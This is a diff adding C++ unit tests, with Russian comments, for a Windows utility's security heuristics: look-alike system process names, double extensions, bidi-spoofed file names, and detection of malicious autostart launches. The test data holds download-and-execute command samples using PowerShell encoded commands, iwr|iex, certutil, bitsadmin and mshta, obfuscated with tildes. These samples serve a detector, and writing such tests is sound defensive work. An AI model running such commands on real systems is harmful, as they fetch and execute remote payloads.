@@ -389,6 +389,77 @@ void TestSafeUrl() {
     CHECK(tools::SafeUrl(L"https://").empty());
 }
 
+// «Защита»: маскировка по имени (похожее на системное, двойное расширение, невидимые знаки) и скрипты в автозапуске
+void TestSecurityHeuristics() {
+    CHECK(tools::OneEdit(L"svchost", L"scvhost"));   // перестановка соседних
+    CHECK(tools::OneEdit(L"svchost", L"svch0st"));   // замена
+    CHECK(tools::OneEdit(L"svchost", L"svchosts"));  // вставка
+    CHECK(!tools::OneEdit(L"svchost", L"svchost"));
+    CHECK(!tools::OneEdit(L"svchost", L"vschots"));
+    std::vector<std::wstring> sys = {L"svchost.exe", L"lsass.exe", L"explorer.exe"};
+    CHECK(tools::LookAlikeIn(L"scvhost.exe", sys) == L"svchost.exe");
+    CHECK(tools::LookAlikeIn(L"svchost.exe", sys).empty());  // само имя - не «похоже»
+    CHECK(tools::LookAlikeIn(L"lsas.exe", sys).empty());     // короткие имена не сравниваем: много ложных
+    CHECK(tools::LookAlikeIn(L"explorer.dll", sys).empty());
+
+    CHECK(tools::DoubleExt(L"отчёт.pdf.exe"));
+    CHECK(tools::DoubleExt(L"фото.jpg      .scr"));  // пробелы прячут настоящее расширение
+    CHECK(tools::DoubleExt(L"счёт.pdf.js"));
+    CHECK(tools::DoubleExt(L"invoice.docx.hta"));
+    CHECK(!tools::DoubleExt(L"setup.exe"));
+    CHECK(!tools::DoubleExt(L"report.pdf"));
+    CHECK(!tools::DoubleExt(L"node.js"));
+
+    CHECK(
+        tools::BidiSpoof(L"отчёт\x202E"
+                         L"fdp.exe"));
+    CHECK(
+        tools::BidiSpoof(L"a\x2067"
+                         L"b.exe"));
+    CHECK(!tools::BidiSpoof(L"Обычное имя (1).exe"));
+
+    // образцы атак собираются при запуске (без «~»): целиком в exe тестов их принимает за вредонос антивирус
+    auto R = [](std::wstring s) {
+        s.erase(std::remove(s.begin(), s.end(), L'~'), s.end());
+        return tools::ScriptLaunch(s);
+    };
+    CHECK(!R(L"pow~ershell.exe -NoP -W Hid~den -Enc~odedCommand SQB~FAFgA").empty());
+    CHECK(!R(L"pw~sh -e~c SQB~FAFgA").empty());
+    CHECK(!R(L"pow~ershell /e SQB~FAFgA").empty());
+    CHECK(!R(L"pow~ershell -c \"i~wr ht~tp://x/a.ps1 | i~ex\"").empty());
+    CHECK(!R(L"pow~ershell (New-Object Net.Web~Client).Down~loadFile('ht~tp://x','a.exe')").empty());
+    CHECK(!R(L"cert~util -url~cache -split -f ht~tp://x/a.exe a.exe").empty());
+    CHECK(!R(L"bits~admin /trans~fer j ht~tp://x/a.exe C:\\a.exe").empty());
+    CHECK(!R(L"msh~ta ht~tp://x/a.hta").empty());
+    CHECK(!R(L"cmd.exe /c C:\\Users\\u\\AppData\\Roaming\\x.bat").empty());
+    CHECK(tools::ScriptLaunch(L"powershell.exe -ExecutionPolicy Bypass -File C:\\Tools\\backup.ps1").empty());
+    CHECK(tools::ScriptLaunch(L"\"C:\\Program Files\\App\\app.exe\" --minimized").empty());
+    CHECK(tools::ScriptLaunch(L"C:\\Windows\\System32\\cmdkey.exe /list")
+              .empty());  // «cmd» в имени - не командная строка
+}
+
+// Сторож служб: антивирусы не выключаем, «вернуть» - только из списка выключенного и с записанным типом запуска
+void TestSysItemOff() {
+    CHECK(tools::SecurityVendor(L"c:\\program files\\crowdstrike\\csfalconservice.exe"));
+    CHECK(tools::SecurityVendor(L"sophos limited"));
+    CHECK(tools::SecurityVendor(L"eset, spol. s r.o."));
+    CHECK(!tools::SecurityVendor(L"c:\\program files\\preset manager\\svc.exe"));  // «eset» внутри слова - не ESET
+    CHECK(!tools::SecurityVendor(L"valve corp."));
+
+    std::wstring t = tools::SysOffAdd(L"", L"svc", L"Foo", SERVICE_AUTO_START);
+    t = tools::SysOffAdd(t, L"drv", L"Bar", SERVICE_SYSTEM_START);
+    t = tools::SysOffAdd(t, L"svc", L"Foo", SERVICE_DEMAND_START);  // второй раз - запись заменяется
+    DWORD start = 99;
+    CHECK(!tools::SysOffTake(t, L"drv", L"Foo", start));  // вид не тот
+    CHECK(tools::SysOffTake(t, L"svc", L"foo", start) && start == SERVICE_DEMAND_START);
+    CHECK(!tools::SysOffTake(t, L"svc", L"Foo", start));  // взяли - больше нет
+    CHECK(tools::SysOffTake(t, L"drv", L"Bar", start) && start == SERVICE_SYSTEM_START);
+    // подделанная строка: служба «при загрузке ядра» и «отключена» не возвращаются
+    std::wstring bad = L"svc\tEvil\t0\nsvc\tOff\t4\n";
+    CHECK(!tools::SysOffTake(bad, L"svc", L"Evil", start));
+    CHECK(!tools::SysOffTake(bad, L"svc", L"Off", start));
+}
+
 // RadialShutUp: каталог без повторов и пустых мест, бэкап значения туда и обратно, профиль
 void TestShutUpCatalog() {
     const auto& all = shutup::Catalog();
@@ -960,4 +1031,6 @@ void TestMore(void (*check)(bool, const char*, int)) {
     TestWinget();
     TestContests();
     TestShutUpCatalog();
+    TestSecurityHeuristics();
+    TestSysItemOff();
 }
